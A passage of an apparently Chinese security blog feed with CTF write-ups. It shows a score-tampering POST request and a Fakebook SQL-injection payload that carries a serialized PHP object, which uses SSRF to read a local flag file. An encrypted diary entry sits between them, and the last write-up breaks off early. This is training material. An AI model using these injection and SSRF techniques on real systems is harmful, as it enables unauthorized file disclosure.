<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS Planet defense game<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"canvas"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点进去拉到最后有几条提示</p>
<p><img src="/pic/8.png" alt=""></p>
<p>生成一个http请求，将分数发到服务器，将结果显示。</p>
<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class="line">Host: 183.129.189.60:10001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class="line"></span><br><span class="line">record&#x3D;23</span><br></pre></td></tr></table></figure>

<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
        <tag>安恒月赛2020</tag>
      </tags>
  </entry>
  <entry>
    <title>年末总结</title>
    <url>/2019/12/31/%E5%B9%B4%E6%9C%AB%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">U2FsdGVkX1+2qkSQkrr13xlZbbf+XrdqR3Et881AtLyXfPKiztTv7+gJyTP0GPCcW66AXebxuxo1oAqFBd9WpRXF3nNvm+UpHrf38bDipf1BNF62pkIB5txiYAWxvYe0AMSYCq17Lz9fNYYZmozkC8NgDE3TWi7940BgxYIuWeq5OZCAvT7OOmthfw7BMZaw0c62c/v84cCgm74DXKxeehT36C8CJk7T/8IPEoiDt8+xICaiTkPg4Yf6mD0Z5SjpfXJIaBpi66bhE68Jbc1R8quYC7fpZptmPxYM7XBFJtwaFC+JwZ7dnFdsFiyDmxGXNhEEiTNrpAw8vkPYBI8DBl7GpZIs1O6Vuabvaeaf0+MWy+LpJpY1zPjlMj93mTcyTLoW5O/bjOHA5bjZQ4TWdz2KP0Bd6NvJNYQM7wkkRWa4pr1v+UmRtrR68PDECeS8UxIFm1iWh8a0XxzqGCkSQ/vY6KtkjIrmKmtiiCec9jV0rqUanlYnbCqHNHLYSfE0P3Fsp6/Q9ijnMC60kxpyCsHcjVzNR3/pYolbffXTs3EkSgj2dNSbhIeST2cUZWzMRPDnUzlPy3eLCBnLJCm++blJ15WeNlt7iqR2HXZFyFQF+ysugR1PucU38l44z6X2Stec5G6JQ2lcl2EuC5UjOzo6PW9Tbu1QTbTRwsHhMmuXbI45snLIUr5uCP7NsnBGE2b+vyLJlpgYlxns5O1jaYoPhwLEM5WmD9ts4rusL2w8+GYyviekIJLWWeBuPnvtOHLZClrWYzCOAHFyUP1hy9RdN2N6gs5Ngd8+vLYPTW2GdCXzZ8sVCvYOuzpVegbryXfNzTAZfMtOKJhWQK3zF3amoixFPEPGaJKpXUmjNjIacFMH+SJL+B6sZxzEm4arCvTSgH0SpxcMV5HSYiJiNHaOraa1yHHwefl7Dq5HuC+LGmkRueHr64zGZz9pfIXDDcC4RAOcGHitmPYlvt2KInVTIEkvZhEMC3rMD7tskKb6PXGD3IH1r9EZPbBvvmwNQ8CT8MZP78AUElO6vi/0vZLt93C/Akwx8uvfe269D+eHVTiusyrwsiils1h27s0PkW3FR8qPyQ8torvQC+8VkFtBCOTmT7oKjUEuUwhMGvmaWqU6q2YNbyxXVJCUvmgoA2CFULwZNO7Q9bXzS62fKSXnDgiJLkEfXGFSxJnLXH1pPH2tkVcSYc2kJl98i1AyQQ5fZPJmul4ZKPogyEs0Dp+KfnxJYY9H5oRhu9OZL8nBd2mklhAdOa+pM8MYhEag+RB6GYXeV6X0Nk57zjspiozwRYJkrx/8JplBrLE+Qfm9Q2XTQbw9v/bXVmzuUbQqEZmGuwNfR8/QbCyNqjGrrk0GfzWZQz8AlvjRMs6uvKfoiqiYHdWmtOkM9TJndQFUskpZkJZb4I9c6q3JGOBF1PGyrSP9ZoPao06N4/BxCJ5R/GXZmhmWTu23N3fYyYPnlC5Vt9hO4yeVpw7voMlBQc/zDTTQKCZdaonuQ0rdD1GoC4ToX6Ibfox2Ou6cYo93fnSX+C15PElKmEkCVKZyBT0RVfjxXd2cZnAj0k/SSTD/5X6g4im78cG7SV3+qq6F2LS2HI8yyVYCWzmxX3kWbDGXT72CpT3HB/k/zhyL034MpHNsWhuVekw0Mo95J01dUJV9OHJbL4GEYAQ4jkN0J61vAJr8fesmbCTipLUvJoYyBTkYqw5GwbmdOLEtCeU9EeSio/yrd9u89ZXOcyI9ghJFU7dWC8HFFrL7KuWZ8jyAKRgZfZckzFmk9M9Z8QPIkenPLPTJjpJwo+fHsmPXH9zkm/7t7IO6pA+wsTAGvTslfP2fvKbj4jz0FoeG1A9cbxcC3ZfQhbf7jBi/auaZkmYmaGqHF5MPKaOYaCcv15JlpV6KZ8GQ8HiKwpUClROFwewDx0rXuWB5oHBfjhzToLjCEiK9AH8nI9Oihh0dYR6pS2P6mVaLjGczrZadEKJ8lLou2Z12hgCW02RfSL6NiDpGmzQZ7lKBVZ+1nmZ6d7rj9caS2J2i35ufQhd716M7nHY4ob/h1LTdtMKM/nDXTsb9Rtka7+ftot+UN4hep/pfbFOc0lrtjHS1yXXcg9Ib7j10PjkRhFkqhh1jjvxf4926Weap5nSsqIP7RLhoSGKgZCxDVS4H8NYYyq/SfTVZQLxc+AsH2N7tEaByWHXNi0sXA9XmhLBH65zrWqJ+qIv/bx9frIMauy1Swf+jUDFqWJ9pSL41jUkyjwfqvzNRkHAD3YwX5OPFoXIJNzyGUFowJ2/R5HlryGoMuWJPfhsIdSKJRPH1LnMzdN2KVcJzrI9n4xcifzRLRFck+3q0s8iFAZEyIVmCU30acUJYpl7b/I9PYeVchNdBP6JQ/Py/AEqcXBibvjPyU/FseIk9tyMsLsHVDdE8h8hZoPOJ0Nx4fCf9PM7QDWrBRyhI8N5I/yzwrely39cjXFf+G1W+tInA4mytEBmASmd9TlMEjK/m8b9lTZb1857mogaA9ZUJTLjIaOROnUZ/4PsK5o6BnCjN5MEt4XbpcmGlO7RWbmryJpZIblsBp0SK5+sEkK6Nv1rYSzGqqPwBuf9pkQ7r/pl8mPcq1NLfxpbjH7pLC3gnBRm7asrGFZnCPcS6GnAWyhSkG3HJUnfCugs9FSte+QnQu1uPFSYWzPtN+YlqLGA4dHGGsm7lgUAROYfesnvNCs4aFgxlBhYnTPBw2UjHbKP3KaH29CRmlR1ZlfCyEf3SCDkgPFHTHZogJ1yQaEi1P4OFL/8epA8496f37HXkMEQXdcS4jQl1QY/9G+vKdMIYb14BB+DAoFWJho/nEjkNrwG3RC7Lp9662gu4ihXDDvVCjsIUkM84uYW1MHlLH/4A2zAkcfTFvrhvFI4A1MIWdapOs6RE5ViA54hvGPJwmy+I0u7qc1kTP9QrDc1YzxVlBbn39jqtHKE6n0wXwVFYlVTEEkbNwoqTn1In+MK61f6t+s+wuIMZwyEuUVO6xAx5ivqhok5GI+Goxth4A+jO+bLNF+jNvsi+RV+Ns2RxtDQZjjGapidnrf36MY9ESH8suSYTeZFA+Nx6ncEEVVrCPWoEbTdVEjDgzwPhVmRmrZ5UN3nJofEMsjQn2hvufabErruW99QDvPPsggJNjkN4Mq8E3fPSdpspYTimgMOkgM5ub5T3184xrcjExzdivrg9qbzq+81SSbjEG7lpmlY+K7JlwagjVpyPDvJj+NQJdqahxRuknrqgCO73ibdAJYikcyoUi554FJMyF3UawU5mR9ogQtVpS4ko/AQ/85VcdQji5Cbb0mMyYW5Xbh/iKPlGKdCcfNQIWo2N0sXQ90yjrMD6/qumWzPn8CL941mdgO32vFCI6yUwzIqe/vIfpDg67ov37dA6J7O/hQLma/w7kfbC3WFQfuDLAKjVELOMxqR8dG26Vxu2LZZRDOezpexYcKzqMB57pEBc+EHZDl/1bvWnDhIpQ+y2fEbMaboqnD8BPSMYTXQMT7ov12Rbz89Yr/nIXs1xScbsCNOz2ymZgjXblz5JxRwoBbriLRQfoy4GggZrbUW/B8c7HLQaXJwXBmJX1q1XqYnsLqaWhcGN2Y/A1wbdMnceUOYnp5H50mq+CH4tGjID2Si0+yAiZ4ZkrCyMNIQ68IQubfCjtgUfpQXJLnMQg9JYXb+LakdNyupMc2j7jJqx0F3s5T5p8+vq9ADLBcZpvh4hpJbNlt+PD8Id6O4PnpXkYF1bKSWVDOJ2Yydb4AGq1LlME5gUdbAjnR7olDP2EBG/GaubOPBB03xX1IOVx7QRQ0O9CGrfviIfktmIHhCwRvSbNkjzvdcVS/IUU5Sm1NLbPKGUuuPDsfwxLq+o2XXamLhTykqOGFSdRybvSrxZX7W7x/YJqvVgNuFgqF3eCm4nGdyjZfV6w5ZXECqVMLGdiAqiLUGS2wYxlxOlxkzdBg2ryqkUMmXto3ZNSdtsTf/KiJQZMCEZ8cNOaZosegpoOCdf7EWpNos3Lftp+b/WfTTjimFT9dOxbdNGCKsXkgUVmI6LEf/C8HZ/4tL+nTTTX4k3AcGtOo+ctbHAMKGhb2c/ZrH5b0l8pWHcZLKULXKqZSbqiXZ6+t6D05F1OdIWKyVUdFavPJrgq6xHmCx5oyTvkTzwFUm6WZZBZkEFgcnnPXdvBGf5IwqEasasGXxRGxCtA91b/AveNRzpxMe2Z5i4Y4qCQj2Mf4foM2U9r+KRowg4skkm4tM0DjN/GIOsVC+W3mps9LhE8QzdS19UqwNQV1w5/2PkqdOqGKYI23SLnSoyK0TmPNB7M923BzzITrkNh3sbTMcoEa8HOxoH/9LHa8xMiCxKD2sFEsE2lqECCKUxeF4AAwUjqxp3hQvrTEAla/Tz1p2PzJPcj0WpGWMVmW6lOsp60yh6MKt9tFEE0riIB4kfqXE95yExmnsvQnh2tHI+qAPyMPTxz+ABWuOt34tZ7DdRfiHNQyOKN7OEO015bk3k7moT76yyrLNQJMHhKRX0tzqNrcsGfG5JTIS+bfjgc6oDeG9s+9bQa8PlupHc1wr4OF46i5WbdzfP6WMFRR1uaA+R2VNgDtuvZR4x1xz+A3wV8UepwKrypmJ34uj1PG/v5aNtNx8TCn+I+oQBUDnN0Qyto/u2JqhD+Q+PUoAfK4nJ16e2oNfGh5aPu5v9ekstP+/UkYY8WFMLrWKwi5IK4gnllLGdjHMS2LbYyM7hy6L0WP8WM+uqpTPeSciUi4GUvIfhAgVJoflyrLdxB+eVdndL5Tf9TpGp9GKP81ii9ea9wBTyKStRcdDqs/sjlhGdfjH5u3U3I1+JypG68N7EOlWLzTQ37vBLhcwT7yI6PjMbq7L6R+5p+HBP1tyj2ym4uyMLQ3m0ONK2nam9eqAQQwhRR8RFdIr91a2U3PX33olMJauGkBRR+T2uI0/vB/eXQ1Y6ddHf05i78y2RTjrc0D4qzRK9/z9H7ElAXo51Xe/SPdXCch5RJiaMuzTTj6g5aDFGNzXQP54u/2n3b7s76owQLFPNgrLcKxeqMa4T1TyvjmUg829HIBCH2Ao1PRN4BYzvNEl+Z4RxP+JkNYTHj1426WrEuYjfvUdxlZuvEeEQ7XKXFhwHa+vJ0N+rpzisdCql5TqImnYrksS7D2GAywCgsnWhujYI77kXY2EmJYtcX7qJ+RfDKxmhE964cqEDG+AdQfOZrSh+eAEJAOnLmNVe5JrjNl6Ru+YO0BRrOYwqWWp+6ifawtcL7q1AnP/Tej8CV1jUGOkvLxArdR/Rm4MzhyP39veB+l2vVFLhs1XOC5Eiv9mCLhVyh7cmFctIdxprTKnf8t/Fo39q+f2Ebw1miiwGwdT+PdJJ1SXt97mAmrF70vjsDXyGJFBI/D/X2iVRpqYyJI2cwF3E2/XVuy9Ja4DAL4/FJXYKsM6BZyhtnnIf930F938gW3cmPzpWUXItgb0X63L48Cdq2cElrs2E6iQv85iKhp1x5/oCpJaviaPHQByLOVH6XoP4ta410O4x0CMnX0xNX9pIqqpvcGwmQLX8wclds3kfEdGqXYSJwdtpz/fCMqM5kQU4ZMAIlieLrCrepZ0XM20vRaDOyYJTOHHb733XD+XFwM60t3qgNNXT+FM+rmq+9aJT100K+4/qMsZ0LqMaJmARijk41KaoNtm8oJlACCw6KAPSGQlf/i0wmJttpCgmCygXKq3GAr8g0CZJK+koF0jsoM3X3ex97/mxxTNs5XcN7nsOXzMsOhx66Kwz3dubjVueMo6z9vyMcXXTDxzKD/bjvvxqqiaywbrA6p7cAsSRvPsWHlfhHX8b6RwP56yQGkruvwU8tJGpq/CJ68QvyqTPlbLlBa8Su1I/R5fn6Cwry6hNkhvMDd7wa7huFVDrxREypZN4jLcUvRTBf/IhCho6Xd6B58rHBiJ5DyXzgFE2h3tk80EVk85rPdhX5IiDQvoc7du9vXk0il7p/29gouNiuxFCdiaVJ/72IkVzKSylBAkdlT6/OzVdQka3wQJ7XY5j+2xDxlA0hu8g7ebJOdfl5/tZVGkRDrDKbS/T5SS1BESjzn4mmBYYS67sHxdXuyg6DwhuIVx4Whbb8jUj2kbj7St8woX9Uv9d6uwV5n5jnjRAT7IF+xrHlbkg6JlU68eCaE7QgyD8rQfRMSXXs1fnlk/IIWc/BU8urWJtlbn/DKpXywloOkwKysXx5ISuCBFxa6QN+Ou5TMmsiDdR7LApitV+RCupJ5PheUlocZx/wAGiZCQqSq8R8TcYLEVyFoDj0G4fW7JhstwfSt9ky0N+qXJPxDlWFFypgl/XCDfbC1vAx3/etxzwuRwEW/+vRmH5UcVbEVx38081clNv6ojW16v8pRB/yD8s/sUjOvwN/ZS0HJVumTc361q9JW2AuMEdI9odP/PdB3vVyQrE5YUo2jTTD+5zpKMdeKE8m4ocMYbyoq472zobZmPEUGGAclwdDgrU1FIIOlkKkV3XHLje0IvCxpfYM/wZei0BFfWKHnBBTwK0OUUGtZ66Jz2FDXn8Zg4zyw==</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录5</title>
    <url>/2019/12/30/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%955/</url>
    <content><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>

<p>拿到<code>user.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();   <span class="comment">//初始化链接</span></span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);     <span class="comment">//设置CURLOPT_URL</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);   <span class="comment">//将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span></span><br><span class="line">        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);  <span class="comment">//获取博客地址</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);  <span class="comment">//博客地址有过滤</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>
<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>
<p><img src="/pic/4.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<p><img src="/pic/5.png" alt=""></p>
<p>查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"ko"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap.min.css"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.3.1.slim.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/popper.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/bootstrap.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                username</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                age</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                blog</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                2            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                12            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                file:///var/www/html/flag.php            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>the contents of his/her blog<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">'100%'</span> <span class="attr">height</span>=<span class="string">'10em'</span> <span class="attr">src</span>=<span class="string">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击即可看见flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;"</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>网鼎杯2018</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录4</title>
    <url>/2019/12/28/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
    <content><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>大致了解flask框架，<a href="http://www.security-database.com/detail.php?alert=CVE-2019-9948" target="_blank" rel="noopener">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">哈希长度扩展攻击</a> 。</p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>
<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>
